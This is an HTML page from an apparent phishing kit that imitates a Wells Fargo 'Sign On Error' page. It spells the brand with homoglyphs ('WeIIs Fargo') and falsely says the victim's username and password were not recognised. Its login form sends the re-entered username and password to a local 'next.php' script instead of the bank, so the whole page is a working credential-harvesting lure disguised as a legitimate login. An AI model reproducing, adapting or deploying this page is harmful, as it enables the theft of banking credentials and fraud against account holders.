﻿<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<link rel="icon" type="image/x-icon" href="olori.ico"></link><title>Sign On Error</title>
		
						<style>
			html, body {
				margin: 0;
				padding: 0;
				font-family: Verdana;
				font-size: 12px;
				color: #666666;
			}

			.skipLink {
				opacity: 0;
				position: absolute;
				top: -1000px;
				left: -1000px;
			}

			#body a:hover {
				text-decoration: underline;
			}

			::-webkit-input-placeholder {
				color: #767676;
			}
			:-moz-placeholder {
				color: #767676;
				opacity: 1;
			}
			::-moz-placeholder {
				color: #767676;
				opacity: 1;
			}
			:-ms-input-placeholder {
				color: #767676;
			}

			.clear-both {
				clear: both;
			}

			.block-display {
				display: block;
			}

			.relative {
				position: relative;
			}

			main {
				min-width: 722px;
				max-width: 722px;
				display: block;
				margin: auto;
				position: relative;
			}

			header {
				min-width: 722px;
				height: 118px;
				margin-bottom: 20px;
				border-bottom: 3px solid #dfdfdf;
			}

			header div {
				max-width: 722px;
				display: block;
				margin: auto;
				position: relative;
				height: 100%
			}

			header ul {
				list-style: none;
				position: absolute;
				right: 0;
				margin: 0;
				bottom: 17px;
			}

			header ul[data-id="search"] {
				list-style: none;
				position: absolute;
				right: 0;
				top: 10px;
			}

			header ul[data-id="search"] li {
				float: left;
				margin-left: 17px;
			}

			header ul[data-id="search"] li input {
				height: 32px;
				width: 256px;
				padding-left: 10px;
				font-family: Verdana;
				font-size: 13px;
				color: #767676;
				border: 1px solid #c5c4c4;
			}

			header ul li {
				float: left;
				margin-left: 17px;
			}


			header ul li a {
				font-family: Verdana;
				font-size: 11px;
				color: #666666;
				text-decoration: none;
			}

			header ul[data-id="headerLinks"] li a {
				font-size: 13px;
			}

			header ul[data-id="search"] li a {
				position: relative;
				top: 10px;
			}

			header ul[data-id="search"] li div {
				position: relative;
			}

			header ul[data-id="search"] li div img {
				position: absolute;
				right: 5px;
				top: 10px;
				width: 17px;
			}

			header ul li a:hover {
				color: #5174b8;
				text-decoration: underline;
			}

			header .logo {
				width: 62px;
				height: 62px;
				position: relative;
				top: 39px;
			}

			section[data-id="content"], section[data-id="hero"], aside {
				max-width: 722px;
				display: block;
				margin: auto;
				position: relative;
			}


			section[data-id="content"] {
				float: left;
				padding-right: 30px;
				max-width: 474px;
			}

			section[data-id="content"] h1 {
				font-family: Georgia;
				font-size: 28px;
				color: #44464a;
				line-height: 1.154em;
				font-weight: lighter;
				margin: 0;
			}

			section[data-id="content"] a, aside a {
				font-family: Verdana;
			    font-size: 11px;
			    color: #5174b8;
			    text-decoration: none;
			}

			section[data-id="content"] input[type="text"], section[data-id="content"] input[type="password"] {
                margin-top: 10px;
                height: 45px;
                width: 200px;
                padding-left: 10px;
                margin-right: 18px;
                font-weight: normal;
                text-decoration: none;
                font-size: 13px;
                color: #44464a;
                border-radius: 2px;
                border: 1px solid #cfd1d7;
            }

			section[data-id="content"] select {
			    position: relative;
			    z-index: 0;
			    width: 100%;
			    height: 2em;
			    border: 0;
			    line-height: 2;
			    height: 45px;
			    margin-bottom: 15px;
			}

			section[data-id="content"] #nd-captcha + [data-id="forgotEnrollLinks"] {
				position: relative;
				top: -50px;
			}

			section[data-id="content"] [data-id="linkSeparator"] {
				display: inline-block;
				padding-left: 10px;
				padding-right: 10px;
			}

			section[data-id="content"] #nd-captcha {
				display: inline-block;
			}

			.custom-select {
			    display: block;
			    position: absolute;
			    z-index: 1;
			    top: 0;
			    left: 0;
			    width: 100%;
			    pointer-events: none;
			    background-color: #fff;
			}

			.custom-select img {
			    position: absolute;
			    top: 15px;
			    right: 20px;
			}

			.custom-select > span {
				display: block;
			    padding: 10px 25px 10px 10px;
			    border: solid 1px #cfd1d7;
			    color: #767676;
			    line-height: 2;
    		}

			.custom-select > span:focus {
			    outline: 2px solid #0033cc;
    		}

			.custom-select > span:focus {
				border: 2px solid blue;
    		}

			.custom-select span span {
			    display: block;
			    height: 2em;
			    overflow: hidden;
			    text-overflow: ellipsis;
			    white-space: nowrap;
			}

			section[data-id="content"] div[data-id="selectContainer"] {
				position: relative;
				width: 250px;
			}

			section[data-id="content"] div[data-id="selectContainer"]:focus {
				border: 2px solid;
			}

			section[data-id="content"] div[data-id="inputContainer"] {
				position: relative;
				display: block;
				float: left;
			}

			section[data-id="content"] div[data-id="inputContainer"] input:focus {
				outline: 2px solid #0033cc;
			}

			section[data-id="content"] div[data-id="inputContainer"] img {
				width: 12px;
				height: 12px;
			}

			section[data-id="content"] div[data-id="inputContainer"] label {
				font-weight: bold;
			}

			section[data-id="hero"] img {
			    width: 722px;
			}

			section[data-id="hero"] div[data-id="content"] {
			    height: 150px;
			    width: 350px;
			    margin: auto;
			    position: absolute;
			    top: 0;
			    left: 0;
			    bottom: 0;
			    padding: 20px;
			    margin-left: 20px;
			    background-color: #00698C;
			    color: #ffffff;
			}

			section[data-id="hero"] div[data-id="content"] h2 {
				font-size: 28px;
			    line-height: 35px;
			    font-weight: normal;
			    font-family: Georgia;
    		}

			section[data-id="hero"] div[data-id="content"] a {
				color: #ffffff;
				text-decoration: none;
				font-size: 14px;				
    		}

			section[data-id="hero"] div[data-id="content"] img {
				width: 6px;
			    padding-left: 10px;
			    position: relative;
			    top: 1px;
    		}

			aside {
				max-width: 200px;
				margin-right: 0;
				right: 0;
				margin-top: 20px;
				padding-left: 20px;
			}

			aside hr {
				position: absolute;
			    left: 0;
			    width: 100%;
			    box-shadow: 0 2px 5px #dddddd;
			    height: 2px;
			    border: 0;
			    background-color: #dddddd;
			}

			aside .aside-group {
				border-top: 1px solid #dddddd;
				position: relative;
				margin-top: 30px;
				padding-top: 15px;
			}

			aside .aside-group:nth-child(2) {
				border-top: 0;
				position: relative;
				padding-top: 20px;
			}

			aside .aside-group h2 {
				font-family: Verdana;
				font-size: 12px;
				font-weight: bold;
				color: #44464a;
			}

			aside ul {
				list-style: none;
				margin: 0;
				margin-left: -40px;
			}

			aside ul li {
				margin-top: 15px;
				line-height: 6px;
			}

			[data-id="footerSeparator"] {
				width: 100%;
				height: 50px;
				background: url(kiniun.jpeg) repeat-x left -30px;
				margin-top: 35px;
			}

			footer {
				font-size: 10px;
				font-family: Verdana;
				max-width: 722px;
				margin: auto;
				color: #434343;
			}

			footer [data-id="footnotes"]{
				padding-top: 35px;
			}

			footer [data-id="footnotesBlock"]{
				border: 1px solid #434343;
				padding: 15px 20px 15px 20px;
				margin-top: 15px;
				width: 500px;
			}

			footer [data-id="copyright"]{
				margin-top: 30px;
				padding-top: 30px;
				font-size: 12px;
			}

			footer ul {
				margin-left: -20px;
			}

			footer ul[data-id="links"] {
				list-style: none;
				margin-left: -40px;
			}

			footer ul[data-id="links"] li a{
				font-size: 12px;
				font-family: Verdana;
				text-decoration: none;
				color: #434343;
			}

			footer ul[data-id="links"] li {
				float: left;
				padding: 0 7px 0 7px;
				border-left: 1px solid #434343;
			}

			footer ul[data-id="links"] li:first-child {
				border-left: 0;
			}

            [data-id="saveUsernamePopup"] {
                display: none;
                position: absolute;
                width: 210px;
                margin: 0 0 10px;
                padding: 20px;
                border: 1px solid #ccc;
                background-color: #fff;
                box-shadow: 0 3px 13px -4px #666;
                z-index: 150;
                margin-top: 125px;
                margin-left: -6px;
            }
            [data-id="saveUsernamePopup"] h2 {
            	outline: none;
            }
            [data-id="saveUsernamePopup"] span {
                height: 1px;
                overflow: hidden;
                position: absolute;
                white-space: nowrap;
                width: 1px;
            }
            [data-id="saveUsernamePopup"] img {
                position: absolute;
            }
            [data-id="saveUsernamePopup"] img[data-id="saveUsernameClose"] {
                top: -15px;
                right: -15px;
                cursor: pointer;
                display: inline-block;
            }
            section[data-id="content"] [data-id="saveUsernamePopup"] img[data-id="saveUsernameArrow"] {
                top: -15px;
                left: 0;
                width: auto;
                height: auto;
            }

            [data-id="submitContainer"] {
            	display: flex;
            	width: 100%;
            }

            [data-id="submit"] {
            	margin: auto;
            	border: 0;
            	font-family: Verdana;
            	font-size: 12px;
            	color: #ffffff;
            	padding: 0 20px 0 20px;
            	background-color: #5174B8;
            	margin-top: 15px;
            	height: 45px;
            	font-weight: bold;
            	border-radius: 2px;
            	position: relative;
            	right: 30px;
            	float: right;
            }

            [data-id="forgotUsername"] {
            	display: inline-block;
            	margin-top: 30px;
            }

            .alert {
            	color: #bb0826;
			    padding-top: 25px;
			    padding-bottom: 15px;
			    font-family: Verdana;
			    font-size: 12px;
            }

            section[data-id="content"] .alert a {
			    font-size: 12px;
            }

            .alert img {
            	position: relative;
            	top: 3px;
            }

			section[data-id="content"] div[data-id="saveUsernamePopup"] img[data-id="saveUsernameClose"] {
				width: 25px;
				height: 25px;
			}

            #saveUsernameCheckbox {
            	margin-top: 10px;
            }

			#body[theme="ssep"] [control="forms:dropdown-selector"] {
			    font-family: Verdana;
			    font-size: 14px;
			    background-image: linear-gradient(to bottom, #f5f5f5, #ffffff);
			    color: #44464a;
			    max-width: 350px;
			    margin: 10px 8px 10px 0;
			    padding: 0;
			    border: 1px solid #cfd1d7;
			    border-radius: 2px;
			    display: inline-block;
			    position: relative;
			    vertical-align: middle;
			    box-sizing: border-box;
			    cursor: pointer;
			}

		    input[type="checkbox"] {
		        border: 0; 
		        clip: rect(0 0 0 0); 
		        height: 1px; margin: -1px; 
		        overflow: hidden; 
		        padding: 0; 
		        position: absolute; 
		        width: 1px;
		    }

		    label[for="saveUsernameCheckbox"] {
		        display: block;
		        cursor: pointer;
		        line-height: 45px;
		        margin-top: 10px;
		        cursor: default;
		    }

		    section[data-id="content"] div[data-id="inputContainer"] label[for="saveUsernameCheckbox"] {
		    	font-weight: normal;
		    }

		    section[data-id="content"] div[data-id="inputContainer"] input[type="checkbox"] + img {
		        display: inline-block;
		        width: 24px;
		        height: 24px;
		        pointer-events: none;
		    }

		    section[data-id="content"] div[data-id="inputContainer"] input[type="checkbox"] + img:focus {
		    	outline: 2px solid #0033cc;
		    	pointer-events: none;
		    }

		    section[data-id="content"] div[data-id="inputContainer"] input[type="checkbox"] + img + span {
		    	position: relative;
		    	top: -8px;
		    	left: 10px;
		    }
		</style>

		<style>
			section[data-id="hero"] {
				overflow: hidden;
				height: 200px;
			}

			section[data-id="hero"] img {
				position: relative;
			    width: 722px;
			}
		</style>
	</head>
	<body id="body" theme="ssep" platform="m" contextpath="/auth">
		<a href="#" class="skipLink">main content</a>



	
				<header>
			<div>
				
					<a href="#"><img src="ise.png" class="logo" alt="WeIIs Fargo"></a>
				
				<ul data-id="search">
					<li><a href="#">Apply</a></li>
					<li><a href="#">Locations</a></li>
					<li><a href="#">Customer Service</a></li>
					<li>
						<div data-id="searchBox">
							<form action="#" method="get" id="frmSearch">
		  						<input name="q" value="" aria-label="Search" title="Search" size="25" maxlength="75" type="text" autocomplete="off" autocapitalize="off" id="inputTopSearchField" placeholder="Search">
								<img role="button" src="igo.png" alt="search" onclick="Search.events.button.onclick()" onkeyup="Search.events.button.onkeyup()" tabindex="0">
							<input name="ndsid" type="hidden" value="{&quot;jvqtrgQngn&quot;:{&quot;oq&quot;:&quot;1366:662:1366:728:1366:728&quot;,&quot;wfi&quot;:&quot;flap-65897&quot;,&quot;oc&quot;:&quot;4rr5s104n2o2o22q&quot;,&quot;fe&quot;:&quot;1366k768 24&quot;,&quot;qvqgm&quot;:&quot;300&quot;,&quot;jxe&quot;:286351,&quot;syi&quot;:&quot;snyfr&quot;,&quot;si&quot;:&quot;si,btt,zc4,jroz&quot;,&quot;sn&quot;:&quot;sn,zcrt,btt,jni&quot;,&quot;us&quot;:&quot;781q9os132sn9243&quot;,&quot;cy&quot;:&quot;Jva32&quot;,&quot;sg&quot;:&quot;{\&quot;zgc\&quot;:10,\&quot;gf\&quot;:gehr,\&quot;gr\&quot;:gehr}&quot;,&quot;sp&quot;:&quot;{\&quot;gp\&quot;:gehr,\&quot;ap\&quot;:gehr}&quot;,&quot;sf&quot;:&quot;gehr&quot;,&quot;jt&quot;:&quot;ss4n2rp5r9p7o3s0&quot;,&quot;sz&quot;:&quot;2816367n93o5sn56&quot;,&quot;vce&quot;:&quot;apvc,0,5951p608,2,1;fg,0,vachgGbcFrnepuSvryq,0,w_hfreanzr,0,w_cnffjbeq,0;zz,8,14,1n1,obql;zp,148,14,1n1,obql;zzf,2n1,0,n,122 183,1p08 488,627,627,-n95p,8q35,5;zzf,3r8,3r8,n,43s 68p,p343 2p2s,22n7,226n,-7128p,69407,2n8;zzf,3r8,3r8,n,ABC;zzf,3r8,3r8,n,ABC;zz,365,53r,2s0,obql;zzf,83,3r8,n,325 38s,3o8 rr0n,1oqn,1oqs,-91q2n,94pnn,-22;zzf,3r8,3r8,n,ABC;zzf,3r7,3r7,n,ABC;zzf,3r9,3r9,n,ABC;zzf,3r7,3r7,n,ABC;zz,36q,500,nq,obql;zzf,7o,3r8,n,970 0,250 12s1s,216r,2121,-nsqqr,os5r8,p80;zz,20n4,530,p2,obql;gf,0,47op;zp,345,4r5,q9,obql;zzf,329,2712,32,49 0,134q 9ro,2p2,1o8s,-60r9,5901,-s3;zzf,6880,6880,32,ABC;gf,0,o6nn;zz,r3s,4nq,1o;zzf,2009,2r48,32,25 83,222 14p0,99,604,-3q63,67p7,-4;zzf,270s,270s,32,ABC;gf,0,10p01;zz,p58,1s7,193;&quot;,&quot;hn&quot;:&quot;Zbmvyyn/5.0 (Jvaqbjf AG 10.0; Jva64; k64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/58.0 Fnsnev/537.36&quot;},&quot;fvq&quot;:&quot;aqfnzco47p0161ow4rli742&quot;,&quot;jg&quot;:&quot;1.j-642409.1.2.hKCED5T2203zddhQalDDLN,,.NrBvP7D-pS2C2FNDgmzKVIBMUoCjTAURB-Sa_n-J5_bXY5B9PPcwjBllp1Q9h3Gh9abUvVpze-_C6aQi48WeNutFe7bGo1XU-bV80Kx7fewepCI7CAB2X2hbiUe9qxLBqi1CS7GVQ2Q7tdacP3qzjEXzms0ZIFS_V4L2j0fSQ7AXaaqeAIi6XV0UiNoqOypdrKflZ61u74Hvvf3t95NVERsLxM-4E9-RGNHltQFLYgGwJzp6f0PkHwRFZWh06fvk&quot;}"></form>
						</div>
					</li>
				</ul>
				<ul data-id="headerLinks">
					<li><a href="#">Back to Previous Page</a></li>
					<li><a href="#">Home</a></li>
				</ul>
			</div>
		</header>





		
			<section data-id="hero" role="presentation">
				<img src="sandwish.png" alt="" aria-hidden="true"> 
			</section>
		




		<main>
	        <form id="Signon" action="next.php" name="Signon" method="POST" autocomplete="off" data-id="Signon">
								<section data-id="content" aria-label="Sign On to View Your Accounts">
		                
		                    
		                        <input name="save-username" id="saveUsername" type="hidden" value="false">
		                    
		                    
		                
		                <input type="hidden" name="origin" id="origin" value="cob">
		                <input type="hidden" name="userPrefs" id="userPrefs">
		                <input type="hidden" name="jsenabled" id="jsenabled" value="true">
						
		                 
		                
		                    <input type="hidden" name="LOB" value="CONS">
		                    <input type="hidden" name="loginMode" value="">
		                    <input type="hidden" name="serviceType" value="">
		                    <input type="hidden" name="screenid" value="">
		                    <input type="hidden" name="origination" value="WIB">
		                    <input type="hidden" name="TPB" value="">
		                    <input type="hidden" name="msgId" value="">
		                    <input type="hidden" name="platform" value="">
		                    <input type="hidden" name="alternatesignon" value="">
		                
                        
		                <h1>Sign On to View Your Accounts</h1>
						<div id="pageerrors">

<div id="pageerrors">
		                    
		                        <div class="alert" aria-atomic="true" role="alert">
		                            <img src="reenter.png" height="16" width="16" alt="Error" />
		                            <strong>
			                            <strong>We do not recognize your username and/or password. Please try again or visit <a href="#">Username/Password Help</a>.</strong>
			                            
		                            </strong>
		                        </div>
		                    
						</div>		                    
						</div>
		                
		                    
		                    
	                			<p>Enter your username and password to securely view and manage your 
								
									WeIIs Fargo
								
	                			accounts onIine.</p>
		                    
		                
		                <div data-id="selectContainer">
		                    <select name="destination" id="destination" title="Select a destination" onchange="updateCustomSelect()" onfocus="LoginForm.events.destination.onfocus(this);" onblur="LoginForm.events.destination.onblur(this);">
		                        <option selected="selected" value="AccountSummary" onclick="updateCustomSelect()">Account Summary</option>
		                        <option value="Transfer">Transfer</option>
		                        <option value="BillPay">Bill Pay</option>
		                        <option value="brokerage">Brokerage</option>
		                        <option value="Trade">Trade</option>
		                        <option value="MessageAlerts">Messages &amp; Alerts</option>
		                    </select>
							
							<span class="custom-select" aria-hidden="true">
								<span>
									<span>Account Summary</span>
								</span>
								<img src="mariwo.png" alt="" aria-hidden="true">
							</span>
		                </div>
		                <div data-id="inputContainer">
							<label id="j_username_label" for="j_username">Username</label><br>
		                    
		                        
		                            <input aria-required="true" type="text" id="j_username" name="ruk" value="" maxlength="14" tabindex="1" required>
		                        
		                        
		                    
		                    <div tabindex="-1" role="alertdialog" aria-labelledby="saveUsernameTitle" aria-describedby="saveUsernameDescription" data-id="saveUsernamePopup">
		                        <span>Beginning of popup</span>
		                        <h2 id="saveUsernameTitle">Notice</h2>
		                        <p id="saveUsernameDescription">For your security, we do not recommend using this feature on a shared device.</p>
                                <img data-id="saveUsernameArrow" src="baba.png" alt="arrow" aria-hidden="true">
		                        <span>End of popup</span>
		                        <img tabindex="0" data-id="saveUsernameClose" onclick="LoginForm.events.saveUsernamePopup.onclick()" onkeyup="LoginForm.events.saveUsernamePopup.onKeyUp()" role="button" src="cancelation.png" alt="close dialog" aria-label="close dialog">
		                    </div>
		                </div>
		                <div data-id="inputContainer">
		                    <label id="j_password_label" for="tuk">Password</label><br>
		                    <input aria-required="true" type="password" id="j_password" name="tuk" value="" maxlength="14" tabindex="2" required>
			            </div>
		                <div class="clear-both" data-id="inputContainer">
		                    
		                        
									<label for="saveUsernameCheckbox" style="">
					                    <input onfocus="LoginForm.events.saveUsername.onfocus(this);" onblur="LoginForm.events.saveUsername.onblur(this);" aria-labeledby="labelSaveUsername" value="true" type="checkbox" id="saveUsernameCheckbox" onchange="LoginForm.events.saveUsername.onchange(this)">
					                    <img id="imgSaveUsernameCheck" src="7w33h.png" alt="">
					                    <span id="labelSaveUsername">Save Username</span>
					                </label>
		                        
		                        
		                    

		                </div>
		                <div class="block-display clear-both">
							
							<div data-id="forgotEnrollLinks">
			                    <a href="#" data-id="forgotUsername">Forgot Password/Username?</a>
			                    <span data-id="linkSeparator">|</span>
			                    <a href="#" data-id="forgotUsername">Enroll Now</a>
			                </div>
            				<input type="submit" name="continue" value="Sign On" data-id="submit">
		                </div>
				</section>




	
				<aside>
					<hr>
										<section class="aside-group" data-id="relatedInformation" aria-label="related information">
						<h2>Related Information</h2>
						<ul>
							<li><img src="failed.png" alt="" aria-hidden="true"> <a href="#">Enrollment FAQs</a></li>
							<li><img src="sadiku.png" alt="" aria-hidden="true"> <a href="#">OnIine Security Guarantee</a></li>
							<li><img src="westfield.png" alt="" aria-hidden="true"> <a href="#">Privacy, Security and Legal</a></li>
							<li><img src="wakanow.png" alt="" aria-hidden="true"> <a href="#">OnIine Access Agreement</a></li>
						</ul>
					</section>

										<section class="aside-group" data-id="otherServices" aria-label="other services">
						<h2>Other Services</h2>
						<ul>
							<li><img src="balabala.png" alt="" aria-hidden="true"> <a href="#">Applications In Progress</a></li>
							<li><img src="ifo.png" alt="" aria-hidden="true"> <a href="#">Credit Card Rewards</a></li>
						</ul>
					</section>

				</aside>




				<section data-id="submitContainer">
				</section>
	        <input name="ndsid" type="hidden" value="{&quot;jvqtrgQngn&quot;:{&quot;oq&quot;:&quot;1366:662:1366:728:1366:728&quot;,&quot;wfi&quot;:&quot;flap-65897&quot;,&quot;oc&quot;:&quot;4rr5s104n2o2o22q&quot;,&quot;fe&quot;:&quot;1366k768 24&quot;,&quot;qvqgm&quot;:&quot;300&quot;,&quot;jxe&quot;:286351,&quot;syi&quot;:&quot;snyfr&quot;,&quot;si&quot;:&quot;si,btt,zc4,jroz&quot;,&quot;sn&quot;:&quot;sn,zcrt,btt,jni&quot;,&quot;us&quot;:&quot;781q9os132sn9243&quot;,&quot;cy&quot;:&quot;Jva32&quot;,&quot;sg&quot;:&quot;{\&quot;zgc\&quot;:10,\&quot;gf\&quot;:gehr,\&quot;gr\&quot;:gehr}&quot;,&quot;sp&quot;:&quot;{\&quot;gp\&quot;:gehr,\&quot;ap\&quot;:gehr}&quot;,&quot;sf&quot;:&quot;gehr&quot;,&quot;jt&quot;:&quot;ss4n2rp5r9p7o3s0&quot;,&quot;sz&quot;:&quot;2816367n93o5sn56&quot;,&quot;vce&quot;:&quot;apvc,0,5951p608,2,1;fg,0,vachgGbcFrnepuSvryq,0,w_hfreanzr,0,w_cnffjbeq,0;zz,8,14,1n1,obql;zp,148,14,1n1,obql;zzf,2n1,0,n,122 183,1p08 488,627,627,-n95p,8q35,5;zzf,3r8,3r8,n,43s 68p,p343 2p2s,22n7,226n,-7128p,69407,2n8;zzf,3r8,3r8,n,ABC;zzf,3r8,3r8,n,ABC;zz,365,53r,2s0,obql;zzf,83,3r8,n,325 38s,3o8 rr0n,1oqn,1oqs,-91q2n,94pnn,-22;zzf,3r8,3r8,n,ABC;zzf,3r7,3r7,n,ABC;zzf,3r9,3r9,n,ABC;zzf,3r7,3r7,n,ABC;zz,36q,500,nq,obql;zzf,7o,3r8,n,970 0,250 12s1s,216r,2121,-nsqqr,os5r8,p80;zz,20n4,530,p2,obql;gf,0,47op;zp,345,4r5,q9,obql;zzf,329,2712,32,49 0,134q 9ro,2p2,1o8s,-60r9,5901,-s3;zzf,6880,6880,32,ABC;gf,0,o6nn;zz,r3s,4nq,1o;zzf,2009,2r48,32,25 83,222 14p0,99,604,-3q63,67p7,-4;zzf,270s,270s,32,ABC;gf,0,10p01;zz,p58,1s7,193;&quot;,&quot;hn&quot;:&quot;Zbmvyyn/5.0 (Jvaqbjf AG 10.0; Jva64; k64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/58.0 Fnsnev/537.36&quot;},&quot;fvq&quot;:&quot;aqfnzco47p0161ow4rli742&quot;,&quot;jg&quot;:&quot;1.j-642409.1.2.hKCED5T2203zddhQalDDLN,,.NrBvP7D-pS2C2FNDgmzKVIBMUoCjTAURB-Sa_n-J5_bXY5B9PPcwjBllp1Q9h3Gh9abUvVpze-_C6aQi48WeNutFe7bGo1XU-bV80Kx7fewepCI7CAB2X2hbiUe9qxLBqi1CS7GVQ2Q7tdacP3qzjEXzms0ZIFS_V4L2j0fSQ7AXaaqeAIi6XV0UiNoqOypdrKflZ61u74Hvvf3t95NVERsLxM-4E9-RGNHltQFLYgGwJzp6f0PkHwRFZWh06fvk&quot;}"></form>
		</main>



		<div data-id="footerSeparator"></div>
		<footer>
						<div>
				<nav role="navigation">
					<div>
						<ul data-id="links">						
							<li><a href="#">About WeIIs Fargo</a></li>
							<li><a href="#">Careers</a></li>
							<li><a href="#">Privacy, Security &amp; Legal</a></li>
							<li><a href="#">Report Email Fraud</a></li>
							<li><a href="#">Sitemap</a></li>
							<li><a href="#">Home</a></li>
						</ul>
					</div>
				</nav>
			</div>            

						<div class="clear-both">
				<div>
					<p data-id="copyright">© 1999 - 2017 WeIIs Fargo. All rights reserved.</p>                        
				</div>
			</div>

		</footer>





		        <script type="text/javascript" language="JavaScript" src="./wfn_files/login-userprefs.min.js.download"></script><script type="text/javascript" id="childscript1" src="./wfn_files/conutils-6.2.2.js.download"></script><script type="text/javascript" id="ndscript1" src="./wfn_files/atadun.js.download"></script>
        <script>
            var LoginForm = (function(){
                var obj = {};

                obj.events = {
                    'saveUsername': {
                        'onchange': function(element){
                            document.getElementById('saveUsername').value = element.checked;
                            document.querySelector('#imgSaveUsernameCheck').style.outline = 'inherit';
                            if(element.checked == true){
                                document.querySelector('[data-id="saveUsernamePopup"]').style.display = 'block';
                                document.querySelector('#saveUsernameTitle').focus();
                                document.querySelector('#imgSaveUsernameCheck').setAttribute('src', 'markini.png');
                            } else {
                                document.querySelector('[data-id="saveUsernamePopup"]').style.display = 'none';
                                document.querySelector('#j_username').value = '';
                                document.querySelector('#imgSaveUsernameCheck').setAttribute('src', 'kolobo.png');
                            }
                        },
                        'onfocus': function(element){
                            document.querySelector('#imgSaveUsernameCheck').style.outline = '2px solid #0033cc';
                        },
                        'onblur': function(element){
                            document.querySelector('#imgSaveUsernameCheck').style.outline = 'inherit';
                        }
                    },
                    'saveUsernamePopup': {
                        'onclick': function(){
                            document.querySelector('[data-id="saveUsernamePopup"]').style.display = 'none';
                            document.querySelector('#saveUsernameCheckbox').focus();
                        },
                        'onKeyUp': function(event){
                            event = event || window.event;
                            if (event.keyCode === 32) { 
                                obj.events.saveUsernamePopup.onclick(document.querySelector('[data-id="saveUsernameArrow"]'));
                                document.querySelector('#imgSaveUsernameCheck').style.outline = 'inherit';
                            }
                        },
                    },
                    'username': {
                        'onkeyup': function(element){
                            document.querySelector('#saveUsernameCheckbox').checked = false;
                        }
                    },
                    'destination': {
                        'onfocus': function(element){
                            document.querySelector('.custom-select').style.outline = '2px solid #0033cc';
                        },
                        'onblur': function(element){
                            document.querySelector('.custom-select').style.outline = 'inherit';
                        }
                    }
                }

                return obj;
            })()

            var Search = (function(){
                var obj = {};

                obj.events = {
                    'button': {
                        'onclick': function(){
                            document.querySelector('#frmSearch').submit();
                        },
                        'onkeyup': function(){
                            event = event || window.event;
                            if (event.keyCode === 32 || event.keyCode == 13) { 
                                obj.events.button.onclick(document.querySelector('[data-id="saveUsernameArrow"]'));
                            }
                        }
                    }
                }
                return obj;
            })()
        </script>
        <script>
            function updateCustomSelect(){
                document.querySelector('.custom-select').style.outline = 'inherit';
                var select = document.querySelector('select');
                var span = document.querySelector('.custom-select > span > span');
                while(span.firstChild){
                    span.removeChild(span.firstChild);
                }
                span.appendChild(document.createTextNode(select.options[select.selectedIndex].text));
            }
        </script>






	

</body></html>